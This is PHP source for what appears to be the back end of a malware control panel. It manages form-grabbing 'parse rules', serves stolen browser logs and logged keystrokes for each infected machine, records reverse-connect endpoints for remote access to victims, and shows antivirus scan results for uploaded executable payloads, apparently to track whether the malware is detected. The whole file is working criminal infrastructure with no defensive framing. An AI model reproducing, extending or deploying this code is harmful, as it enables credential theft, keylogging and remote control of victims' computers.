<?php

require_once('inc/require.php');
require_once('inc/load.php');

if(isset($_POST['addRule']))
{
	$rule_name = mysql_real_escape_string($_POST['rule_name']);
	$rule_url = mysql_real_escape_string($_POST['rule_url']);
	$rule_vars = mysql_real_escape_string($_POST['rule_vars']);
	$rule_rule = mysql_real_escape_string($_POST['rule_rule']);
	
	mysql_query("INSERT INTO parse_rules SET name='$rule_name', url='$rule_url', vars='$rule_vars', rule='$rule_rule'");

}

else if(isset($_POST['getRule']))
{
	$rule_id = (int)$_POST['rule_id'];
	
	$sqlRes = mysql_query("SELECT * FROM parse_rules WHERE id='$rule_id'");
	if(mysql_num_rows($sqlRes)>0)
	{
		$result = mysql_fetch_assoc($sqlRes);
		exit($result['name'] . "\r\n" . $result['url'] . "\r\n" . $result['vars']. "\r\n" . $result['rule']);
	}
	else exit ('wtf? not found');

}

else if(isset($_POST['editRule']))
{
	$rule_id = (int)$_POST['rule_id'];
	$rule_name = mysql_real_escape_string($_POST['rule_name']);
	$rule_url = mysql_real_escape_string($_POST['rule_url']);
	$rule_vars = mysql_real_escape_string($_POST['rule_vars']);
	$rule_rule = mysql_real_escape_string($_POST['rule_rule']);
	
	mysql_query("UPDATE parse_rules SET name='$rule_name', url='$rule_url', vars='$rule_vars', rule='$rule_rule' WHERE id='$rule_id'");

}

else if(isset($_POST['addBlUrl']))
{
	$bl_url = mysql_real_escape_string($_POST['bl_url']);
	
	mysql_query("INSERT INTO log_blacklist SET url='$bl_url'");

}

else if(isset($_POST['getLog']))
{
	$unique_id = mysql_real_escape_string($_POST['unique_id'] ); 
	$log_id = (int)$_POST['log_id'];

	$sqlRes = mysql_query("SELECT log FROM logs WHERE unique_id='$unique_id' and log_id='$log_id'");
	if(mysql_num_rows($sqlRes)>0)
	{
		$result = mysql_fetch_assoc($sqlRes);
		exit($result['log']);
	}
	else exit ('wtf? not found');
}

else if(isset($_POST['getKeys']))
{
	$unique_id = mysql_real_escape_string($_POST['unique_id'] ); 
	$log_id = (int)$_POST['log_id'];

	$sqlRes = mysql_query("SELECT logged_keys FROM `keys` WHERE unique_id='$unique_id' and log_id='$log_id'");
	if(mysql_num_rows($sqlRes)>0)
	{
		$result = mysql_fetch_assoc($sqlRes);
		exit(str_replace("[RETURN]", "[RETURN]\n", $result['logged_keys']));
	}
	else exit ('wtf? not found');
}

else if(isset($_POST['reverseConnect']))
{
	$unique_id = mysql_real_escape_string($_POST['unique_id']); 
	$client = mysql_real_escape_string($_POST['client']); 
	$protocol = mysql_real_escape_string($_POST['protocol']); 
	
	if(mysql_num_rows(mysql_query("SELECT * FROM `reverse_connect` WHERE unique_id='$unique_id' AND protocol='$protocol'")) > 0)
		mysql_query("UPDATE `reverse_connect` SET client='$client' WHERE unique_id='$unique_id' AND protocol='$protocol'");
	else
		mysql_query("INSERT into `reverse_connect` SET unique_id='$unique_id', client='$client', protocol='$protocol'");
}

else if(isset($_POST['av_results']))
{
	$pfile =mysql_real_escape_string( $_POST['file']);
	$file = $_vars['uploadDir'].$pfile.'.exe';

	if(!file_exists($file)) exit ('hack attempt. file not exists.');


	$sql = mysql_query("SELECT filename, av_result, virus_check, last_check FROM uploads WHERE hash='".$pfile."'");
	if(mysql_num_rows($sql)>0)
	{
		$arr = mysql_fetch_array($sql);

		if($arr['av_result']=='') exit ('File not scanned yet.');

		printf('<center><h4 class="title">%s</h4></center>', sprintf("Scan result logs for file %s", $arr['filename']));
		
		$data = $arr['av_result'];

		if(strstr($data, '<td>')) echo $data;
		else
		{

			$json_arr = json_decode($data);

			while(list($key, $val) = each($json_arr))
			{

				if($val!='OK') 
				{
				$color = 'Red';
				}
				else 
				$color ='Lime';

				$re= '<span class="caption">%s</span> <span class="data" style="color: %s">%s</span><br>'."\r\n";


				printf($re, $key, $color, $val); 

			}

		}

		echo '<hr /><span class="caption">Scanned time:</span> <span class="data">'.date("m/d/Y H:i:s", $arr['last_check']).'</span><br>'."\r\n";

		exit;
	}
	
	else
	{ 
		AddBlackIP($ip);
	}
}

?>